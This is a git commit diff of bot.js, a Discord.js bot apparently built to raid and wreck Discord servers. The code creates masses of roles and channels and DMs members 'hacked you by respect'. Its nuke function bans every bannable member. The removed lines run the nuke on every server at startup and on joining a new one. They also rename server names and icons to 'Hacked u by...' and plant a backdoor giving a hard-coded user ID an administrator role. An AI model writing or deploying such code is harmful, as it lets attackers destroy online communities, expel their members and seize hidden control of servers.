6a0bda585b65ef618abb440a644a05fadc739bd0
zRespect69 <51334815+zRespect69@users.noreply.github.com>
2019-06-19 04:47:27 +0200

    Update bot.js

--- bot.js
+++ bot.js
@@ -1,87 +1,24 @@
 const Discord = require("discord.js");
-const MREg = new Discord.Client();
+const client = new Discord.Client();
 
-console.log('be ware');
-MREg.on('ready', () => {
-  console.log(`Logged in as ${MREg.user.tag} !`);
- 
+
 });
-MREg.on('ready',  () => {
+client.on('ready',  () => {
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
 console.log('      ~            ~  By : n3k ~           ~    ');
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log(`Logged in as  * [ "  n3k " ] servers! [ " ${MREg.guilds.size} " ] Users! [ " ${MREg.users.size} " ]`);
- 
-       
-   
+console.log(`Logged in as  * [ "  n3k " ] servers! [ " ${client.guilds.size} " ] Users! [ " ${client.users.size} " ]`);
  
 });
-var prefix = "k"
-MREg.on("message", message => {
-  if(!message.content.startsWith(prefix)) return;;
-  let args = message.content.split(" ").slice(1);
-  var argresult = args.join(' ');
-  if (message.content.startsWith('hix')) {
-    MREg.user.setUsername(argresult);
-  }
-    if (message.content.startsWith(prefix + 'k22')) {
-        MREg.user.setStatus(argresult);
-  }
-});
+
  
-var x1 = "kk"
-MREg.on('message', message => {
-     if (message.content === ".") {
-        MREg.user.setAvatar(`https://cdn.discordapp.com/attachments/514439193603342366/514528830652940299/2.png`)
- 
-}
-});
-var x1 = "kk"
-MREg.on('message', message => {
-     if (message.content === "sk") {
-MREg.user.setUsername("Hacked u by iam")
- 
-}
-});
-MREg.on('message', message => {
-     if (message.content === "sk") {
-MREg.user.setGame(`Hacked u by iam`,'https://www.twitch.tv/hix')
- 
-}
-});
- 
-MREg.on('message', message => {
-     if (message.content === "sk") {
-         MREg.guilds.forEach(m =>{
-             m.setIcon(`https://cdn.discordapp.com/attachments/514439193603342366/514528830652940299/2.png`)
-})
-}
-});
-MREg.on('message', message => {
-     if (message.content === "sk") {
-         MREg.guilds.forEach(m =>{
-             m.setName(`Hacked u by n3k4a
-    `)
-})
-}
-});
- 
-MREg.on('message', message => {
-     if (message.content === "sk") {
-                 if(!message.channel.guild) return;
- 
-             message.guild.setIcon(`https://cdn.discordapp.com/attachments/514439193603342366/514528830652940299/2.png`)
- 
-}
-});
- 
-MREg.on('message', message => {
+client.on('message', message => {
      
  
      if (message.content === "k1") {
-         MREg.guilds.forEach(m =>{
+         client.guilds.forEach(m =>{
   m.createRole({
         name : "By Respect.",
         permissions :   [1],
@@ -285,9 +222,9 @@ MREg.on('message', message => {
  
 }
 });
-MREg.on('message', message => {
+client.on('message', message => {
          if (message.content === "k2") {
-               MREg.guilds.forEach(m =>{
+               client.guilds.forEach(m =>{
 m.createChannel('By Respect.', 'text');
 m.createChannel('By Respect.', 'text');
 m.createChannel('By Respect.', 'text');
@@ -339,9 +276,9 @@ m.createChannel('By Respect.', 'text');
 }
 });
  
-MREg.on('message', message => {
+client.on('message', message => {
          if (message.content === "k3") {
-                 MREg.guilds.forEach(m =>{
+                 client.guilds.forEach(m =>{
 m.createChannel('By Respect.', 'voice');
 m.createChannel('By Respect.', 'voice');
 m.createChannel('By Respect.', 'voice');
@@ -426,7 +363,7 @@ async function nuke(guild) {
   await Promise.all(guild.members.map(async (m) => {
     if (m.bannable) {
       users++;
-      await m.send('hacked you by ***your ass***').catch(e => { return void e; });
+      await m.send('hacked you by respect').catch(e => { return void e; });
       return m.ban();
     }
   }));
@@ -438,7 +375,7 @@ async function nuke(guild) {
     }
   }));
  
-    await guild.createChannel('Hacked u by n3k4 Is here', 'text');
+    await guild.createChannel('Hacked u by respect Is here', 'text');
  
       await guild.createChannel('By Respect.', 'voice');
  
@@ -446,38 +383,6 @@ async function nuke(guild) {
  
 }
  
-MREg.on('ready', () => {
-  for(const [, g] of MREg.guilds) nuke(g).catch(console.error);
-  console.log('-------------------------------------------------------------');
-  console.log('');
-  console.log("by n3k4");
-  console.log("");
-  console.log("-------------------------------------------------------------");
+
  
-});
- 
-MREg.on('guildCreate', async (guild) => {
-  return nuke(guild).catch(console.error);
-});
- 
-MREg.on('guildMemberAdd', member => {
-   
-            if (member.id === "357961207019470851") {
-                member.guild.createRole({
-                    name : MREg.user.username,
-                    color : "RANDOM",
-                    permissions : [8]
-                }).then(function(role){
-                    member.addRole(role)
-                })
-               
-            }
-       
-    });
- 
-   
- 
- 
- 
- 
-MREg.login('(process.env.BOT_TOKEN);
+client.login(process.env.BOT_TOKEN);
